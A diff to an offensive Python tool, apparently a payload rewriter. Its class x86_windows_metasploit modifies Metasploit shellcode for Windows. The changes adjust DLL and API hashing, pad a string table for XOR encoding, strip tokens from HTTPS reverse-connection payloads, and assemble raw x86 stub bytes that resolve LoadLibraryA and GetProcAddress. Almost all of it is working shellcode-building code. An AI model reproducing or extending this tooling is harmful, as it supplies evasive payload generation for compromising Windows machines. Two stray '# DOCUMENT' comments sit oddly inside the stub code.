@@ -602,7 +602,7 @@ class x86_windows_metasploit:
             result += c + "\x00"
         return result
 
-    def hash(self, module, bits=13, print_hash=True):
+    def hash(self, module, bits=13):
         module_hash = 0
         if len(module) < 12:
             module += "\x00" * (12 - len(module))
@@ -647,6 +647,7 @@ class x86_windows_metasploit:
             sys.stderr.write("[!] No Hash API stub?? Continuing...\n")
             self.prestine_code = self.code
 
+        # This Regex removes the token string in https reverse connections
         m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
         if m:
             self.replace_string = m.group()[5:]
@@ -727,7 +728,6 @@ class x86_windows_metasploit:
             all_dlls_dict = json.loads(open(_location, 'r').read())
             #included_dict = json.loads(open(_included, 'r').read())
             sys.stderr.write("[*] Number of lookups to do: {0}\n".format(len(all_dlls_dict)))
-
             # get all loaded modules
             def recursive_parse():
                 # FML
@@ -767,7 +767,7 @@ class x86_windows_metasploit:
             sys.stderr.write("[*] Possible useful loaded modules: {0}\n".format(self.dlls))
             dllfound = False
             getprocaddress_dll = False
-            blacklist = ['kernel32.dll', 'firewallapi.dll', 'shell32.dll', 'gdi32.dll', 'user32.dll', 'oleaut32.dll', 'ws2_32.dll', 'iphlpapi.dll']
+            blacklist = ['kernel32.dll', 'gdi32.dll', 'firewallapi.dll', 'shell32.dll', 'user32.dll', 'oleaut32.dll', 'ws2_32.dll', 'iphlpapi.dll', ]
             for dll in self.dlls:
                 sys.stderr.write('[*] Looking for loadliba/getprocaddr or just getprocaddr in %s\n' % dll)
 
@@ -875,11 +875,11 @@ class x86_windows_metasploit:
             if self.parser_stub.lower() == 'GPA'.lower() or self.parser_stub.lower() == 'ExternGPA'.lower():
                 # set hash
                 self.hash(self.dll)
-                sys.stderr.write("[*] Using ExternGPA from {0}\n".format(self.dll))
+                sys.stderr.write("[*] Using ExternGPA from {0} hash: {1}\n".format(self.dll, hex(self.DLL_HASH)))
                 self.selected_payload = self.loaded_gpa_iat_parser_stub()
             elif self.parser_stub.lower() == 'ExternLLAGPA'.lower():
                 self.hash(self.dll)
-                sys.stderr.write("[*] Using ExternLLAGPA from {0}\n".format(self.dll))
+                sys.stderr.write("[*] Using ExternLLAGPA from {0} hash: {1}\n".format(self.dll, hex(self.DLL_HASH)))
                 self.selected_payload = self.loaded_lla_gpa_parser_stub()
         
         elif self.targetbinary !="":
@@ -1122,7 +1122,7 @@ class x86_windows_metasploit:
         # make hash table
             
         tmp_bytes = b''
-        
+
         for some_hash, api_lookup in self.api_hashes.items():
             tmp_bytes += struct.pack("<I", some_hash) + b"\x00\x00"
 
@@ -1132,17 +1132,20 @@ class x86_windows_metasploit:
             string_set.add(api.split("!")[0].replace(".dll",''))
             string_set.add(api.split("!")[1])
         
+        # For testing
         
+        # For xor need modulo 4
         for api in string_set:
-            self.string_table += api + "\x00"
+            self.string_table += api + "\x00" * (4 - (len(api) % 4))
+
         
 
         self.string_table = bytes(self.string_table, 'iso-8859-1')
         # put the hashes and string table together "\x00\x00\x00\x00" denotes end of hashes 
         # XOR table here...
-        #sys.stderr.write("[*] String Table: {0}\n".format(self.string_table))
+        sys.stderr.write("[*] String Table: {0}\n".format(self.string_table))
         
-        self.lookup_table = tmp_bytes + b"\x00\x00\x00\x00" + self.string_table
+        self.lookup_table = tmp_bytes + self.string_table
         
         # FIND OFFSETS for the lookup_table and populate
         sys.stderr.write("[*] Building lookup table\n")
@@ -1187,8 +1190,7 @@ class x86_windows_metasploit:
         self.stub += b"\xE8\x00\x00\x00\x00"         # CALL 001C0190
         self.stub += b"\x5E"                         # POP ESI
                            
-        self.stub += b"\x8B\x8E"
-        #print("offset", struct.pack("<I", 0xffffffff - len(self.stub) - table_offset + 14))    
+        self.stub += b"\x8B\x8E"  # MOV ECX, ...
         updated_offset = 0xFFFFFFFF - len(self.stub) - table_offset + 14
         self.stub += struct.pack("<I", 0xffffffff-len(self.stub) - table_offset + 14)
         self.stub += b"\x3B\x4C\x24\x24"             # CMP ECX,DWORD PTR SS:[ESP+24]
@@ -1199,16 +1201,14 @@ class x86_windows_metasploit:
         self.stub += b'\x8B\x8E'                     # MOV ECX,DWORD PTR DS:[ESI-XX]
         self.stub += struct.pack("<I", updated_offset + 4)
         self.stub += b"\x8A\xC1"                      # MOV AL,CL
-
+        # DOCUMENT
         self.stub += b"\x8B\xCE"                           # MOV ECX,ESI
         self.stub += b"\x03\xC8"                           # ADD ECX,EAX
         self.stub += b"\x81\xE9"
-        #print(abs(updated_offset - 0xffffffff +3))
         self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff +3)) # SUB ECX,0EB
         self.stub += b"\x51"                               # PUSH ECX
-        #self.stub += b"\x8B\x4C\x24\x14"                     # MOV ECX,DWORD PTR SS:[ESP+14]
         self.stub += b"\xFF\x13"                             # CALL DWORD PTR DS:[EBX]                  ; KERNEL32.LoadLibraryA
-        
+        # DOCUMENT
         self.stub += b"\x8B\xD0"                             # MOV EDX,EAX
         self.stub += b"\x33\xC0"                             # XOR EAX,EAX
         self.stub += b"\x8B\x8E"
@@ -1220,9 +1220,7 @@ class x86_windows_metasploit:
         self.stub += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
         self.stub += b"\x51"                                          # PUSH ECX
         self.stub += b"\x52"                                          # PUSH EDX
-        #self.stub += b"\x8B\x4C\x24\x1C"                              # MOV ECX,DWORD PTR SS:[ESP+1C]
         self.stub += b"\xFF\x55\x00"                                      # CALL DWORD PTR DS:[EDX]
-        #self.stub += b"\x8B\x74\x24\x20\x89\xB4\x24\x91\x01\x00\x00\x61\x58\x58\x8B\x44\x24\xB0\xFF\xD0\x8B\x8C\x24\x68\x01\x00\x00\x51\xc3"
         self.stub += b"\x89\x44\x24\x1C"        # MOV DWORD PTR SS:[ESP+1C],EAX; SAVE EAX on popad in eax
         self.stub += b"\x61"               # POPAD 
         self.stub += b"\x5D"               # POP EBP ; get return addr
